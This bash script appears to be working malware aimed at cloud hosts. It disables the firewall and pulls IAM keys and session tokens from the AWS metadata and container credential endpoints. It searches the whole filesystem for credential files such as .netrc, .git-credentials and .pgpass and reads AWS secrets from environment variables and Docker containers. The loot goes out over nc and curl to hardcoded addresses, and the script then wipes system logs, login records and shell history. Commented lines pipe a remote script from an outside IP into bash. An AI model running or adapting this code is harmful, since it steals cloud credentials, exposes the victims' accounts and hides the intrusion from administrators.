#!/bin/bash
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin:$HOME/.local/bin
export LC_ALL=C.UTF-8 2>/dev/null
export LANG=C.UTF-8 2>/dev/null
export LC_ALL=en_US.UTF-8 2>/dev/null
export HISTFILE=/dev/null
HISTSIZE=0;unset HISTFILE
if [ -z "$HOME" ];then export HOME=/tmp;fi
if [ ! -d "$HOME" ];then mkdir -p $HOME;fi
trap notraces 1 3 9

# curl -Lk hxxp://45.9.148.221/sh/get/aws.sh | bash
# wget hxxp://45.9.148.221/sh/get/aws.sh -O - | bash

LOCK_FILE="/tmp/.aws.c2g.lock"
TIME_1_OUT=90


ACF=("credentials" "cloud" ".npmrc" \
"credentials.gpg" ".s3cfg" ".passwd-s3fs" "authinfo2" ".s3backer_passwd" ".s3b_config" "s3proxy.conf")

CRED_FILE_NAMES=(\
"credentials" ".s3cfg" ".passwd-s3fs" "authinfo2" ".s3backer_passwd" ".s3b_config" "s3proxy.conf" \
"access_tokens.db" "credentials.db" ".smbclient.conf" ".smbcredentials" ".samba_credentials" \
".pgpass" "secrets" ".boto" ".netrc" ".git-credentials" ".gitconfig" "api_key" "censys.cfg" \
"ngrok.yml" "filezilla.xml" "recentservers.xml" "queue.sqlite3" "servlist.conf" "accounts.xml")



int_main(){
fwall
dns_opt

get_aws_data
send_aws_data
#curl -Lk https://raw.githubusercontent.com/SoOM3a/AwsAttacks/main/awsIMDSv2.sh | bash
notraces
}

fwall(){
if type iptables 2>/dev/null 1>/dev/null; then
iptables -P INPUT ACCEPT 2>/dev/null 1>/dev/null
iptables -P FORWARD ACCEPT 2>/dev/null 1>/dev/null
iptables -P OUTPUT ACCEPT 2>/dev/null 1>/dev/null
iptables -t nat -F 2>/dev/null 1>/dev/null
iptables -t mangle -F 2>/dev/null 1>/dev/null
iptables -F 2>/dev/null 1>/dev/null
iptables -X 2>/dev/null 1>/dev/null
fi
}

dns_opt(){
echo "nameserver 8.8.4.4" >> /etc/resolv.conf 2>/dev/null
echo "nameserver 8.8.8.8" >> /etc/resolv.conf 2>/dev/null
}

dload() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} http/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

notraces(){
#chattr -i $LOCK_FILE 2>/dev/null 1>/dev/null
#rm -f $LOCK_FILE 2>/dev/null 1>/dev/null
rm -f /var/log/syslog.* 2>/dev/null 1>/dev/null
rm -f /var/log/auth.log.* 2>/dev/null 1>/dev/null
lastlog --clear --user root 2>/dev/null 1>/dev/null
lastlog --clear --user $USER 2>/dev/null 1>/dev/null
echo > /var/log/wtmp 2>/dev/null
echo > /var/log/btmp 2>/dev/null
echo > /var/log/lastlog 2>/dev/null
echo > /var/log/syslog 2>/dev/null
echo > /var/log/auth.log 2>/dev/null

rm -f ~/.bash_history 2>/dev/null 1>/dev/null
touch ~/.bash_history 2>/dev/null 1>/dev/null
chattr +i ~/.bash_history 2>/dev/null 1>/dev/null
history -cw
#clear

}


get_aws_data(){

AWS_INFO=$(dload http://169.254.169.254/latest/meta-data/iam/info | tr '\0' '\n')
AWS_1_EC2=$(dload http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\0' '\n')
AWS_1_IAM_NAME=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/)



echo -e '\n-------- CREDS FILES -----------------------------------' >> $CSOF

for CREFILE in ${CRED_FILE_NAMES[@]}; do echo "searching for $CREFILE"
find / -maxdepth 23 -type f -name $CREFILE 2>/dev/null | xargs -I % sh -c 'echo :::%; cat %' >> $EDIS 

cat $EDIS 

cat $EDIS >> $CSOF

rm -f $EDIS

done




if [ ! -z "$AWS_INFO" ]; then echo -e '\n-------- INFO ------------------------------------------' >> $CSOF
echo $AWS_INFO | sed 's/,/\n/g' | sed 's/ }//g' | grep 'InstanceProfileId\|InstanceProfileArn' | sed 's# "InstanceProfileArn" : "#InstanceProfileArn : #g' | sed 's# "InstanceProfileId" : "#InstanceProfileId  : #g' |sed 's/"//g' >> $CSOF
fi


if [ ! -z "$AWS_1_EC2" ]; then echo -e '\n-------- EC2 -------------------------------------------' >> $CSOF
echo $AWS_1_EC2 | tr ',' '\n' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | sed 's# "Token" : "#aws configure set aws_session_token #g' | sed 's# "Expiration" : "#\n\nExpiration : #g' | sed 's/"//g' >> $CSOF
fi


if [ ! -z "$AWS_1_IAM_NAME" ]; then
AWS_1_IAM=$(dload http://169.254.169.254/latest/meta-data/iam/security-credentials/$AWS_1_IAM_NAME | tr '\0' '\n')
if [ ! -z "$AWS_1_IAM" ]; then echo -e '\n-------- IAM -------------------------------------------' >> $CSOF
echo $AWS_1_IAM | sed 's/,/\n/g' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | sed 's# "Token" : "#aws configure set aws_session_token #g' | sed 's# "Expiration" : "#\n\nExpiration : #g' | sed 's/"//g' >> $CSOF
fi
fi


if [ ! -z "$AWS_ACCESS_KEY_ID" ] || [ ! -z "$AWS_SECRET_ACCESS_KEY" ] || [ ! -z "$AWS_SESSION_TOKEN" ] || [ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ] || [ ! -z "$AWS_CONFIG_FILE" ] || [ ! -z "$AWS_DEFAULT_REGION" ] || [ ! -z "$AWS_REGION" ] || [ ! -z "$AWS_EC2_METADATA_DISABLED" ] || [ ! -z "$AWS_ROLE_ARN" ] || [ ! -z "$AWS_WEB_IDENTITY_TOKEN_FILE" ] || [ ! -z "$AWS_ROLE_SESSION_NAME" ] || [ ! -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ] ; then
echo -e '\n-------- ENV DATA --------------------------------------' >> $CSOF

if [ ! -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then 
dload http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  | sed 's/,/\n/g' | grep 'AccessKeyId\|SecretAccessKey\|Token\|Expiration' | sed 's#"AccessKeyId":"#aws configure set aws_access_key_id #g' | sed 's#"SecretAccessKey":"#aws configure set aws_secret_access_key #g' | sed 's#"Token":"#aws configure set aws_session_token #g'| sed 's#"Expiration":"#\nExpiration:  #g'| sed 's/"//g' >> $CSOF
fi

if [ ! -z "$AWS_ACCESS_KEY_ID" ]; then echo "AWS_ACCESS_KEY_ID : $AWS_ACCESS_KEY_ID" >> $CSOF ; fi
if [ ! -z "$AWS_SECRET_ACCESS_KEY" ]; then echo "AWS_SECRET_ACCESS_KEY : $AWS_SECRET_ACCESS_KEY" >> $CSOF ; fi
if [ ! -z "$AWS_SESSION_TOKEN" ]; then echo "AWS_SESSION_TOKEN : $AWS_SESSION_TOKEN" >> $CSOF ; fi
if [ ! -z "$AWS_SHARED_CREDENTIALS_FILE" ]; then echo "AWS_SHARED_CREDENTIALS_FILE : $AWS_SHARED_CREDENTIALS_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_CONFIG_FILE" ]; then echo "AWS_CONFIG_FILE : $AWS_CONFIG_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_DEFAULT_REGION" ]; then echo "AWS_DEFAULT_REGION : $AWS_DEFAULT_REGION" >> $CSOF ; fi
if [ ! -z "$AWS_REGION" ]; then echo "AWS_REGION : $AWS_REGION" >> $CSOF ; fi
if [ ! -z "$AWS_EC2_METADATA_DISABLED" ]; then echo "AWS_EC2_METADATA_DISABLED : $AWS_EC2_METADATA_DISABLED" >> $CSOF ; fi
if [ ! -z "$AWS_ROLE_ARN" ]; then echo "AWS_ROLE_ARN : $AWS_ROLE_ARN" >> $CSOF ; fi
if [ ! -z "$AWS_WEB_IDENTITY_TOKEN_FILE" ]; then echo "AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE" >> $CSOF ; fi
if [ ! -z "$AWS_ROLE_SESSION_NAME" ]; then echo "AWS_ROLE_SESSION_NAME : $AWS_ROLE_SESSION_NAME" >> $CSOF ; fi
fi


docker ps 2>/dev/null 1>/dev/null
if [[ "$?" = "0" ]]; then 

4W5_DOCKER=$(docker inspect $(docker ps -aq) | grep "AWS\|EC2")

if [ ! -z "$4W5_DOCKER" ]; then echo -e '\n-------- FROM DOCKER ------------------------------------' >> $CSOF
echo $4W5_DOCKER >> $CSOF
fi

fi
}


send_aws_data(){
cat $CSOF
SEND_B64_DATA=$(cat $CSOF | base64 -w 0)
cat $CSOF  | nc 172.31.13.115 9999 
echo ""
curl --upload-file $CSOF 192.168.61.78:9999
}

int_main

chattr -i $LOCK_FILE 2>/dev/null 1>/dev/null
rm -f $LOCK_FILE 2>/dev/null 1>/dev/null
send_aws_data

##########End##########
